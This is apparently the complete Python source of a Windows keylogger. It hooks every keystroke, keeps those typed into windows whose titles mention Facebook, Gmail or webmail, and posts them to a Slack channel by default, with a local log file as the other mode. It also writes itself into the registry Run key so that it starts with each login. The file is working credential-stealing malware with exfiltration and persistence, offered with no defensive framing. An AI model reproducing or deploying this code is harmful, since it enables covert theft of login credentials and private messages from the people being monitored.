import pythoncom, pyHook
import os
import sys
import win32event, win32api, winerror
import configparser
import time
from datetime import datetime
from slackclient import SlackClient
from _winreg import *

#########################################
#		INITIALIZATION VARIABLES		#
#########################################

# Slack link:
config = configparser.ConfigParser()
config.read('slack.ini')
slack_channel = config['channel']['ch1']
slack_token = config['token']['tk1']
slack_client = SlackClient(slack_token)
# File info
FILE = 'logfile.log'
DATA = ''
DATA_LENGTH = 50

# Keywords for algorithm
key_words = ['FACEBOOK', 'GMAIL', 'WEBMAIL']

# Log configuration
# mode 0: log on local file
# mode 1: log on slack server
MODE = 1


#################################
#		KEYLOGGER FUNCTIONS 	#
#################################

def run_at_startup():
	path = os.path.dirname(os.path.realpath(__file__))
	fname = sys.argv[0]
	full_path = "\\".join([path, fname])
	sub_key = 'Software\Microsoft\Windows\CurrentVersion\Run'
	with OpenKey(HKEY_CURRENT_USER, sub_key, 0, KEY_ALL_ACCESS) as key:
		SetValueEx(key, "Keylogger", 0, REG_SZ, full_path)

def on_keyboard(event):
	global DATA
	if is_relevant_window(event.WindowName, key_words):
		if event.Ascii == 13: # return pressed
			key_pressed = '[RETURN]'
		elif event.Ascii == 9: # tab pressed
			key_pressed = '[TAB]'
		elif event.Ascii == 8:
			key_pressed = '[BACK]'
		else:
			# convert pressed key using Ascii look up table
			key_pressed = chr(event.Ascii)
		DATA += key_pressed
		if len(DATA) >= DATA_LENGTH:
			log_info = {'datum': datetime.now().__str__(), 'WindowName': event.WindowName,
						'DATA': DATA}
			log = "{d[datum]} :: {d[WindowName]} :: {d[DATA]} \n".format(d=log_info)
			if MODE == 0:
				log_on_file(FILE, log)
			elif MODE == 1:
				log_on_cloud(slack_client, slack_channel, log)
			DATA = ''
	return True

def log_on_file(file, DATA):
	# append the input DATA in the log file
	with open(file, 'a') as f:
		f.write(DATA)

def log_on_cloud(client, channel, DATA):
	client.api_call(
		"chat.postMessage",
		channel=channel,
		text=DATA)

#################################
#		ALGORITHM RELEVANT  	#
#################################

def is_relevant_window(WindowName, key_words):
	res = False
	upper_case_wn = WindowName.upper()
	for key_word in key_words:
		if key_word in upper_case_wn:
			res = True
	return res


####################
#		MAIN	   #
####################

if __name__ == '__main__':
	run_at_startup()
	hm = pyHook.HookManager()
	hm.SubscribeKeyDown(on_keyboard)
	hm.HookKeyboard()
	# infinite loop
	pythoncom.PumpMessages()
